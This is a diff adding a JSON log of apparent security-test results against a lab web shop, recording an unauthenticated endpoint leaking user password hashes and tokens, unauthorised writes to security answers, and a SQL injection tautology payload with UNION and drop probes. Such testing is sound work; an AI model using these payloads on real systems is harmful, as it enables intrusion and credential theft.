@@ -1,0 +1,144 @@
+{
+ "timestamp": "2026-10-05T02:17:22Z",
+ "target": "http://lab-mutator:3000",
+ "f1": {
+  "request": {
+   "method": "GET",
+   "url": "/rest/memories",
+   "headers": {},
+   "body": null
+  },
+  "status": 200,
+  "content_type": "application/json; charset=utf-8",
+  "length": 6134,
+  "access_control_allow_origin": "*",
+  "user_fields": [
+   "createdAt",
+   "deletedAt",
+   "deluxeToken",
+   "email",
+   "id",
+   "isActive",
+   "lastLoginIp",
+   "password",
+   "profileImage",
+   "role",
+   "totpSecret",
+   "updatedAt",
+   "username"
+  ],
+  "sample": {
+   "email": "bjoern@owasp.org",
+   "password": "9283f1b2e9669749081963be0462e466",
+   "role": "deluxe",
+   "deluxeToken": "efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4",
+   "totpSecret": ""
+  },
+  "user_count": 10,
+  "controls": {
+   "/rest/wallet/balance": {
+    "status": 401
+   },
+   "/rest/basket": {
+    "status": 401
+   },
+   "/rest/user/authentication-details": {
+    "status": 401
+   },
+   "/api/SecurityAnswers/": {
+    "status": 401
+   }
+  }
+ },
+ "f2": {
+  "request": {
+   "method": "POST",
+   "url": "/api/SecurityAnswers/",
+   "headers": {
+    "Content-Type": "application/json; charset=utf-8"
+   },
+   "body": {
+    "questionId": 7,
+    "answer": "verify-new",
+    "email": "verify@repro.test"
+   }
+  },
+  "get_status": 401,
+  "get_body": "<html>   <head>     <meta charset='utf-8'>      <title>UnauthorizedError: No Authorization header was found</title>     <style>* {   margin: 0;   padd",
+  "post1_status": 201,
+  "post1_id": 30,
+  "post2_status": 201,
+  "post2_id": 31,
+  "empty_post_status": 201
+ },
+ "f3": {
+  "request": {
+   "method": "GET",
+   "url": "/rest/products/search?q=%27%20OR%20%271%27=%271",
+   "headers": {},
+   "body": null
+  },
+  "filtered_status": 200,
+  "filtered_len": 921,
+  "filtered_ids": [
+   1,
+   24,
+   47
+  ],
+  "tautology_status": 200,
+  "tautology_len": 16557,
+  "tautology_ids": [
+   1,
+   24,
+   6,
+   52,
+   51,
+   42,
+   53,
+   30,
+   50,
+   3,
+   54,
+   25,
+   49,
+   22,
+   41,
+   5,
+   33,
+   48,
+   38,
+   8,
+   43,
+   34,
+   37,
+   19,
+   13,
+   45,
+   26,
+   14,
+   18,
+   15,
+   16,
+   7,
+   17,
+   20,
+   9,
+   36,
+   35,
+   2,
+   47,
+   56,
+   32,
+   23,
+   4,
+   55,
+   29,
+   21
+  ],
+  "payload_in_catalog_names": false,
+  "malformed_status": 500,
+  "malformed_preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>     <style>* {   margin: 0;  ",
+  "drop_status": 200,
+  "drop_len": 30
+ }
+}
